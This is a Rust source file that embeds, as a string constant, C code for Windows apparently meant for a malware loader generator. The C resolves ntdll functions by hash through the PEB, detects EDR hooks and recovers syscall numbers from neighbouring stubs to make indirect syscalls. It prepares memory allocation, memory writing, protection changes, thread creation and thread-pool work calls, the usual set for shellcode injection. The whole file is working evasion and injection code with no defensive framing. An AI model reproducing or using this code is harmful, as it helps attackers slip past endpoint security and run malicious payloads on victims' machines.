pub const WINAPI_C: &str = r#"#include "winapi.h"
#include "macros.h"
#include "struct.h"
#include <windows.h>

NT_CONFIG g_NT_CONFIG = {0};
NT_API g_NT_API = {0};

int InitNtdllConfig() {

    PPEB pPeb = (PEB *)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte =
        (PLDR_DATA_TABLE_ENTRY)((PBYTE)
                                    pLdr->InMemoryOrderModuleList.Flink->Flink -
                                0x10);
    PBYTE pBase = B_PTR(pDte->DllBase);

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs =
        (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir =
        (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr
                                              .DataDirectory
                                                  [IMAGE_DIRECTORY_ENTRY_EXPORT]
                                              .VirtualAddress);

    if (!pImgExportDir) return 0;
    g_NT_CONFIG.dwNumberOfNames = pImgExportDir->NumberOfNames;
    g_NT_CONFIG.pdwArrayOfAddresses =
        (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    g_NT_CONFIG.pdwArrayOfNames =
        (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    g_NT_CONFIG.pwArrayOfOrdinals =
        (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    g_NT_CONFIG.uModule = pBase;

    return (!g_NT_CONFIG.pdwArrayOfAddresses || !g_NT_CONFIG.pdwArrayOfNames ||
            !g_NT_CONFIG.pwArrayOfOrdinals)
               ? 0
               : 1;
}
int InitNtSyscall(IN PNT_CONFIG pNtConfig, IN DWORD dwSysHash,
                  OUT PNT_SYSCALL pNtSys) {
    for (size_t i = 0; i < pNtConfig->dwNumberOfNames; i++) {
        PCHAR pFunctionName =
            (PCHAR)(pNtConfig->uModule + pNtConfig->pdwArrayOfNames[i]);
        PVOID pFunctionAddress =
            (PVOID)(pNtConfig->uModule +
                    pNtConfig
                        ->pdwArrayOfAddresses[pNtConfig->pwArrayOfOrdinals[i]]);
        /* if the function params (dwSysHash) is Tp*Work_Hash,
         * we just need function address */
        if (dwSysHash == TpAllocWork_Hash || dwSysHash == TpPostWork_Hash ||
            dwSysHash == TpReleaseWork_Hash) {
            if (HASHA(pFunctionName) == dwSysHash) {
#ifdef DEBUG
                PRINTA("[+] Ntdll function match found\n\t[i] %s\n",
                       pFunctionName);
#endif
                pNtSys->pSyscallAddress = pFunctionAddress;
#ifdef DEBUG
                PRINTA("\t\t\\_ pSyscallAddress: %p\n",
                       pNtSys->pSyscallAddress);
#endif
                return 1;
            }
        }
        /* other syscall function, we will search ssn and address */
        if (HASHA(pFunctionName) == dwSysHash) {
#ifdef DEBUG
            PRINTA("[+] Ntdll function match found\n\t[i] %s\n", pFunctionName);
#endif
            pNtSys->pSyscallAddress = pFunctionAddress;

            if (!FunctionHook((PBYTE)pFunctionAddress)) {
                BYTE high = *((PBYTE)pFunctionAddress + 5);
                BYTE low = *((PBYTE)pFunctionAddress + 4);
                pNtSys->dwSsn = (high << 8) | low;
                break;
            }
            if (FunctionHook((PBYTE)pFunctionAddress) == 1) {
                for (WORD idx = 1; idx <= RANGE; idx++) {
                    if (!FunctionUpDown((PBYTE)pFunctionAddress, idx)) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                        pNtSys->dwSsn = (high << 8) | low - idx;
                        break;
                    }
                    if (FunctionUpDown((PBYTE)pFunctionAddress, idx)) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                        pNtSys->dwSsn = (high << 8) | low + idx;
                        break;
                    }
                }
            }
            if (FunctionHook((PBYTE)pFunctionAddress) == 2) {
                for (WORD idx = 1; idx <= RANGE; idx++) {
                    if (!FunctionUpDown((PBYTE)pFunctionAddress, idx)) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                        pNtSys->dwSsn = (high << 8) | low - idx;
                        break;
                    }
                    if (FunctionUpDown((PBYTE)pFunctionAddress, idx)) {

                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                        pNtSys->dwSsn = (high << 8) | low + idx;
                        break;
                    }
                }
            }
            break;
        }
    }

    if (!pNtSys->pSyscallAddress) return 0;
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F &&
            *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break;
        }
    }
#ifdef DEBUG
    PRINTA("\t\t\\_ dwSsn: %d\n", pNtSys->dwSsn);
    PRINTA("\t\t\\_ pSyscallAddress: %p\n", pNtSys->pSyscallAddress);
    PRINTA("\t\t\\_ pSyscallInstAddress: %p\n", pNtSys->pSyscallInstAddress);
#endif
    return (pNtSys->dwSsn != NULL && pNtSys->pSyscallAddress != NULL &&
            pNtSys->pSyscallInstAddress != NULL)
               ? 1
               : 0;
}

int InitNtApi() {

    if (!InitNtSyscall(&g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtCreateThreadEx_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtCreateThreadEx)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtProtectVirtualMemory_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtWriteVirtualMemory_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtWriteVirtualMemory)) ||
        !InitNtSyscall(&g_NT_CONFIG, NtWaitForSingleObject_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.NtWaitForSingleObject)) ||
        !InitNtSyscall(&g_NT_CONFIG, TpAllocWork_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.TpAllocWork)) ||
        !InitNtSyscall(&g_NT_CONFIG, TpPostWork_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.TpPostWork)) ||
        !InitNtSyscall(&g_NT_CONFIG, TpReleaseWork_Hash,
                       S_PTR(NT_SYSCALL, g_NT_API.TpReleaseWork)))

        return 0;
    return 1;
}
HMODULE GetModuleHandleS(DWORD dwModuleName) {
    PPEB pPeb = (PEB *)__readgsqword(0x60);

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte =
        (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {
        if (pDte->FullDllName.Length != NULL) {
#ifdef DEBUG
            PRINTA("\t[*] FOUND DLL: %ls\n", pDte->FullDllName.Buffer);
#endif
            /* Convert to a new char[] */
            CHAR UpperDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperDllName[i] = (CHAR)UpperChar(pDte->FullDllName.Buffer[i]);
                i++;
            }
            UpperDllName[i] = '\0';
            if (HASHA(UpperDllName) == dwModuleName) {
#ifdef DEBUG
                PRINTA("[+] Match Dll Found \"%ls\" \n",
                       pDte->FullDllName.Buffer);
#endif
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
            }
        } else
            break;
        pDte = *(PLDR_DATA_TABLE_ENTRY *)(pDte);
    }

    return NULL;
}

FARPROC GetProcAddressS(IN HMODULE hModule, IN DWORD dwApiName) {

    PBYTE pBase = B_PTR(hModule);

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs =
        (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir =
        (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr
                                              .DataDirectory
                                                  [IMAGE_DIRECTORY_ENTRY_EXPORT]
                                              .VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray =
        (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray =
        (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR *pFunctionName = (CHAR *)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress =
            (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        if (HASHA(pFunctionName) == dwApiName) {
#ifdef DEBUG
            PRINTA("[+] Found Target Function - %s - %p\n", pFunctionName,
                   pFunctionAddress);
#endif
            return pFunctionAddress;
        }
    }

    return NULL;
}

int FunctionHook(IN PBYTE pFunctionAddress) {
    /* the function not hooked */
    if (*(pFunctionAddress) == 0x4C && *(pFunctionAddress + 1) == 0x8B &&
        *(pFunctionAddress + 2) == 0xD1 && *(pFunctionAddress + 3) == 0xB8 &&
        *(pFunctionAddress + 6) == 0x00 && *(pFunctionAddress + 7) == 0x00)
        return 0;
    /* the function hooked [example 1] */
    if (*((PBYTE)pFunctionAddress) == 0xE9) return 1;
    /* the function hooked [example 2] */
    if (*((PBYTE)pFunctionAddress + 3) == 0xE9) return 2;
}
int FunctionUpDown(IN PBYTE pFunctionAddress, WORD idx) {

    // check neighboring syscall down
    if (*(pFunctionAddress + idx * DOWN) == 0x4C &&
        *(pFunctionAddress + 1 + idx * DOWN) == 0x8B &&
        *(pFunctionAddress + 2 + idx * DOWN) == 0xD1 &&
        *(pFunctionAddress + 3 + idx * DOWN) == 0xB8 &&
        *(pFunctionAddress + 6 + idx * DOWN) == 0x00 &&
        *(pFunctionAddress + 7 + idx * DOWN) == 0x00)
        return -1;
    // check neighboring syscall up
    if (*(pFunctionAddress + idx * UP) == 0x4C &&
        *(pFunctionAddress + 1 + idx * UP) == 0x8B &&
        *(pFunctionAddress + 2 + idx * UP) == 0xD1 &&
        *(pFunctionAddress + 3 + idx * UP) == 0xB8 &&
        *(pFunctionAddress + 6 + idx * UP) == 0x00 &&
        *(pFunctionAddress + 7 + idx * UP) == 0x00)
        return 1;
}

HMODULE GetNtdllHandle() {

    PPEB pPeb = (PEB *)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte =
        (PLDR_DATA_TABLE_ENTRY)((PBYTE)
                                    pLdr->InMemoryOrderModuleList.Flink->Flink -
                                0x10);
    return (HMODULE)pDte->DllBase;
}

"#;